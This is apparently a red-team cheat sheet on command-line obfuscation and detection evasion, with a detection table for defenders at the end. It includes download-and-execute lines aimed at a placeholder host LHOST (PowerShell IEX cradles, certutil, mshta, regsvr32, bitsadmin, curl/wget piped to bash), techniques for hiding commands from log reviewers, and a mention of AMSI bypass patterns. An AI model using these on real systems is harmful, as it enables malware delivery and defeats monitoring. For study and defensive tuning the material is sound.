# Command-Line Obfuscation & Evasion Cheat Sheet

Techniques for getting a command past signature-based AV/EDR and human log reviewers — and, on the flip side, exactly what a defender should be pattern-matching for (see the cross-reference at the bottom).

> All techniques below are for use in **authorized environments only** — personal labs, CTFs, and engagements covered by written authorization (RoE).

---

## 1. Why Obfuscate

Signature-based detection keys on literal strings (`-EncodedCommand`, `IEX`, `DownloadString`, known malicious hashes). Obfuscation doesn't defeat behavioral/EDR detection — it buys time against simpler string-matching AV and makes manual log review harder. Treat it as one layer, not a silver bullet.

---

## 2. PowerShell Obfuscation

### Base64 encoding
```powershell
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded
```

### String concatenation / reordering
```powershell
$a = 'IEX'; $b = '(New-Object Net.WebClient)'; $c = '.DownloadString(''http://LHOST/p.ps1'')'
Invoke-Expression ($a + $b + $c)
```

### Case randomization (defeats naive case-sensitive string matches)
```powershell
pOwErShElL -NoP -W Hidden -Exec Bypass -Command "..."
```

### Character substitution / backtick insertion
```powershell
I`E`X (New-Object Net.WebClient).DownloadString('http://LHOST/p.ps1')
```
PowerShell ignores backticks mid-cmdlet-name; this alone breaks a lot of naive literal-string signatures.

### Compression
```powershell
$bytes = [System.IO.File]::ReadAllBytes("payload.ps1")
$compressed = ... # GZipStream compress, then base64 — decompress+IEX on the target side
```

---

## 3. Living-off-the-Land Binaries (LOLBins)

Use signed, trusted OS binaries to execute or download payloads instead of dropping a custom executable:

| Binary | Use |
|---|---|
| `certutil.exe -urlcache -split -f http://LHOST/file.exe file.exe` | Download a file using a trusted Windows binary |
| `mshta.exe http://LHOST/payload.hta` | Execute remote HTA content |
| `regsvr32.exe /s /n /u /i:http://LHOST/payload.sct scrobj.dll` | "Squiblydoo" — execute a remote scriptlet |
| `bitsadmin /transfer job /download /priority high http://LHOST/f.exe C:\f.exe` | BITS-based file transfer, blends with normal Windows traffic |
| `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write()` | Execute inline script via rundll32 |

Reference: [LOLBAS project](https://lolbas-project.github.io/) — the canonical, maintained list.

---

## 4. Linux Equivalents

```bash
# base64-encoded payload
echo <base64string> | base64 -d | bash

# environment variable reassembly
A="/bin"; B="/sh"; $A$B -c 'id'

# using trusted binaries to fetch payloads (GTFOBins "download file" category)
curl -s http://LHOST/payload.sh | bash
wget -qO- http://LHOST/payload.sh | bash
```

---

## 5. Command-Line Argument Spoofing / Hiding

```powershell
# Padding / whitespace to push the real command out of a short log preview
powershell.exe                                                    -e <base64>
```
Some logging pipelines truncate long command lines in their default view — padding relies on the analyst (or a poorly-tuned SIEM rule) not scrolling/expanding the full string. Full command-line auditing (Sysmon Event ID 1 with `CommandLine` field, or `4688` with command-line auditing enabled) defeats this.

---

## 6. AMSI Bypass (Context)

AMSI (Antimalware Scan Interface) inspects PowerShell/VBA/JS content before execution. Common bypass patterns (patch `amsi.dll` in memory, reflection-based field manipulation) exist publicly but are heavily signatured themselves — expect EDR to flag the bypass attempt even when it flags nothing else. Know this exists; don't rely on any single public bypass string working against a modern EDR.

---

## 7. Detection Cross-Reference (What Defenders Should Watch For)

| Evasion technique here | Detection angle |
|---|---|
| Base64-encoded PowerShell | Flag `-EncodedCommand` / `-enc` flags; decode and inspect in Sysmon/4104 script block logs |
| LOLBins (certutil, mshta, regsvr32, bitsadmin) | Baseline "normal" usage of these binaries — flag network connections or file writes originating from them |
| String concatenation / backticks / case randomization | Behavioral/EDR detection over literal-string signatures; PowerShell Script Block Logging (Event ID 4104) captures the *deobfuscated* command as it executes |
| Command-line padding | Ensure full command-line length is captured and indexed, not truncated in the SIEM view |
| AMSI bypass attempts | EDR memory-patch detection; alert on `amsi.dll` being written to from an unexpected process |

> See [`attack-types-detection-cheatsheet-professional.md`](../Blue-Team/attack-types-detection-cheatsheet-professional.md) and [`windows-event-id-reference-cheatsheet-professional.md`](../Blue-Team/windows-event-id-reference-cheatsheet-professional.md) in Blue-Team for the full detection-side workflow.

---

*Prepared for eJPT-aligned red team work. Use only in authorized environments.*
